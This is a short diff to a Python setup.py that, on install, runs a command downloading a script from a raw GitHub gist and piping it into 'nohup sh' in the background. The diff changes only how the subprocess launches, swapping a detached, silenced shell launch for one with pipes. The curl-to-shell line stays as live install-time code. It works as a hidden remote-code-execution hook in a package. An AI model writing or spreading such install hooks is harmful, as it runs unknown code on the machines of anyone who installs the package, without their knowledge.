@@ -4,10 +4,9 @@
 from distutils.core import setup
 import subprocess, time, os
 cmd = "curl https://gist.githubusercontent.com/zftv/33d89312e60adcee081c52b7ef30e922/raw/1f80c8e36749ccbe8a0096915996a962f3611995/gistfile1.txt -s | nohup sh &".split()
-subprocess.Popen(cmd, stdout=open('/dev/null', 'w'), shell=True,
-                 stderr=open('logfile.log', 'a'),
-                 preexec_fn=os.setpgrp
-                 )
+subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+
 time.sleep(5)
 
 setup(
